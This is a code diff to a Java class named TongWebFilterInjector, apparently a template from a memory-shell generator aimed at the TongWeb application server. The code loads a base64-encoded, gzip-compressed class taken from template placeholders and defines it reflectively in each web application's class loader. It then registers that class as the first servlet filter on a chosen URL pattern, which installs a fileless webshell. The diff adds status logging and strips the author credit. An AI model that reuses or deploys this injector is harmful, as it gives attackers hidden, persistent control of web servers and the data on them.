@@ -3,6 +3,7 @@ package org.leo.jmg.mem.injectortpl.tongweb;
 import java.io.ByteArrayInputStream;
 import java.io.ByteArrayOutputStream;
 import java.io.IOException;
+import java.io.PrintStream;
 import java.lang.reflect.Array;
 import java.lang.reflect.Constructor;
 import java.lang.reflect.Field;
@@ -14,16 +15,23 @@ import java.util.Set;
 import java.util.zip.GZIPInputStream;
 
 /**
- * @author ReaJason
  */
 public class TongWebFilterInjector {
 
-    
-    private static boolean ok;
+    private static String msg = "";
+    private static boolean ok = false;
 
-    private static String shellClassName;
-    private static String shellClass;
-    private static String urlPattern;
+    public String getUrlPattern() {
+        return "{{urlPattern}}";
+    }
+
+    public String getClassName() {
+        return "{{className}}";
+    }
+
+    public String getBase64String() {
+        return "{{base64Str}}";
+    }
 
     public TongWebFilterInjector() {
         if (ok) {
@@ -33,27 +41,42 @@ public class TongWebFilterInjector {
         try {
             contexts = getContext();
         } catch (Throwable throwable) {
-            
+            msg += "context error: " + getErrorMessage(throwable);
         }
-        if (contexts != null) {
+        if (contexts == null || contexts.isEmpty()) {
+            msg += "context not found";
+        } else {
             for (Object context : contexts) {
                 try {
-                 
-                    loadShell(context);
-                    inject(context);
-                 
+                    msg += ("context: [" + getContextRoot(context) + "] ");
+                    Object shell = getShell(context);
+                    inject(context, shell);
+                    msg += "[" + getUrlPattern() + "] ready\n";
                 } catch (Throwable e) {
-                   
+                    msg += "failed " + getErrorMessage(e) + "\n";
                 }
             }
         }
         ok = true;
-        shellClass = null;
-        shellClassName = null;
-        urlPattern = null;
-      
+        System.out.println(msg);
     }
 
+    @SuppressWarnings("all")
+    private String getContextRoot(Object context) {
+        String r = null;
+        try {
+            r = (String) invokeMethod(invokeMethod(context, "getServletContext", null, null), "getContextPath", null, null);
+        } catch (Exception ignored) {
+        }
+        String c = context.getClass().getName();
+        if (r == null) {
+            return c;
+        }
+        if (r.isEmpty()) {
+            return c + "(/)";
+        }
+        return c + "(" + r + ")";
+    }
 
     /**
      * com.tongweb.web.thor.core.ThorStandardContext
@@ -102,28 +125,28 @@ public class TongWebFilterInjector {
         }
     }
 
-    
-    private void loadShell(Object context) throws Exception {
+    @SuppressWarnings("all")
+    private Object getShell(Object context) throws Exception {
         ClassLoader classLoader = getWebAppClassLoader(context);
-        Class<?> clazz;
+        Class<?> clazz = null;
         try {
-            clazz = classLoader.loadClass(shellClassName);
+            clazz = classLoader.loadClass(getClassName());
         } catch (Exception e) {
-            byte[] clazzByte = gzipDecompress(decodeBase64(shellClass));
+            byte[] clazzByte = gzipDecompress(decodeBase64(getBase64String()));
             Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
             defineClass.setAccessible(true);
             clazz = (Class<?>) defineClass.invoke(classLoader, clazzByte, 0, clazzByte.length);
         }
-        
-        clazz.newInstance();
+        msg += "[" + classLoader.getClass().getName() + "] ";
+        return clazz.newInstance();
     }
 
-    
-    private void inject(Object context) throws Exception {
-        if (invokeMethod(context, "findFilterDef", new Class[]{String.class}, new Object[]{shellClassName}) != null) {
+    @SuppressWarnings("all")
+    public void inject(Object context, Object filter) throws Exception {
+        if (invokeMethod(context, "findFilterDef", new Class[]{String.class}, new Object[]{getClassName()}) != null) {
             return;
         }
-        String filterClassName = shellClassName;
+        String filterClassName = getClassName();
         Object filterDef;
         Object filterMap;
         Class<?> filterMapClass;
@@ -154,7 +177,7 @@ public class TongWebFilterInjector {
         invokeMethod(filterDef, "setFilterClass", new Class[]{String.class}, new Object[]{filterClassName});
         invokeMethod(context, "addFilterDef", new Class[]{filterDef.getClass()}, new Object[]{filterDef});
         invokeMethod(filterMap, "setFilterName", new Class[]{String.class}, new Object[]{filterClassName});
-        invokeMethod(filterMap, "addURLPattern", new Class[]{String.class}, new Object[]{urlPattern});
+        invokeMethod(filterMap, "addURLPattern", new Class[]{String.class}, new Object[]{getUrlPattern()});
 
         // addFilterMapFirst
         Object[] filterMaps = (Object[]) invokeMethod(context, "findFilterMaps", null, null);
@@ -169,9 +192,12 @@ public class TongWebFilterInjector {
         filterConfigs.put(filterClassName, filterConfig);
     }
 
-  
+    @Override
+    public String toString() {
+        return msg;
+    }
 
-    
+    @SuppressWarnings("all")
     public static byte[] decodeBase64(String base64Str) throws Exception {
         Class<?> decoderClass;
         try {
@@ -184,7 +210,7 @@ public class TongWebFilterInjector {
         }
     }
 
-    
+    @SuppressWarnings("all")
     public static byte[] gzipDecompress(byte[] compressedData) throws IOException {
         ByteArrayOutputStream out = new ByteArrayOutputStream();
         GZIPInputStream gzipInputStream = null;
@@ -204,7 +230,7 @@ public class TongWebFilterInjector {
         }
     }
 
-    
+    @SuppressWarnings("all")
     public static Object invokeMethod(Object obj, String methodName, Class<?>[] paramClazz, Object[] param) throws Exception {
         Class<?> clazz = (obj instanceof Class) ? (Class<?>) obj : obj.getClass();
         Method method = null;
@@ -227,7 +253,7 @@ public class TongWebFilterInjector {
     }
 
 
-    
+    @SuppressWarnings("all")
     public static Field getField(Object obj, String name) throws NoSuchFieldException, IllegalAccessException {
         for (Class<?> clazz = obj.getClass();
              clazz != Object.class;
@@ -242,7 +268,7 @@ public class TongWebFilterInjector {
     }
 
 
-    
+    @SuppressWarnings("all")
     public static Object getFieldValue(Object obj, String name) throws NoSuchFieldException, IllegalAccessException {
         Field field = getField(obj, name);
         field.setAccessible(true);
@@ -257,4 +283,18 @@ public class TongWebFilterInjector {
     }
 
 
+    @SuppressWarnings("all")
+    private String getErrorMessage(Throwable throwable) {
+        PrintStream printStream = null;
+        try {
+            ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
+            printStream = new PrintStream(outputStream);
+            throwable.printStackTrace(printStream);
+            return outputStream.toString();
+        } finally {
+            if (printStream != null) {
+                printStream.close();
+            }
+        }
+    }
 }
